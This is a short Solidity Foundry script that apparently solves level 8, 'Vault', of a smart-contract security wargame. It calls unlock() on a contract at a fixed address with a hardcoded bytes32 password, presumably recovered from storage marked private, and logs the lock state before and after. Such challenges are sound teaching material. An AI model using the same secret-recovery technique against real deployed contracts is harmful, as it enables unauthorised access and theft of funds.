// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/08-Vault/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level08Solution is Script {
    Vault vaultInstance = Vault(address(0x72b3ea50eBACc33E49c079Be6559aF458cfc52e9));
    function run() external {
        vm.startBroadcast();
        console.log("lock : ", vaultInstance.locked());
        bytes32 _password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        vaultInstance.unlock(_password);
        console.log("lock : ", vaultInstance.locked());
        vm.stopBroadcast();
    }
}